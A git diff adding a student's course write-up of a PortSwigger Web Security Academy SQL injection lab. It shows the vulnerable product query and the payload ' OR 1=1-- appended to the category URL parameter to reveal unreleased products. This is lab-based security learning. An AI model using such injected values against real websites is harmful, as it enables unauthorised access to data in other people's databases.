@@ -81,19 +81,31 @@ sudo apt-get -y dist-upgrade
 
 ## e) Johnny tables. Solve Portswigger Labs - SQL injection
 when we go to the website and search for a category the website link apears as below
+
 b0346dba681f7d9f900780082.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories
+
 This will give the below SQL
+
 SELECT * FROM products
+
 WHERE category ='Clothing, shoes and accessories'
+
 But we need an output of one or more unreleased products in all categories
+
 To get that we need an SQL like below
+
 SELECT * FROM products
+
 WHERE category ='Clothing, shoes and accessories' OR 1=1
+
 This OR 1=1 shows the products in the mention catogery OR 1=1
+
 since this is always true this will return all the other catogeries products also
 
 b0346dba681f7d9f900780082.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories'+OR+1=1--
+
 when we add -- anything written after this will consider as a comment
+
 <img width="845" alt="image" src="https://github.com/QwQw-1122/Information-Security-course/assets/142783507/1531e111-d122-4249-b7d3-6afb3db98ab2">
 
 
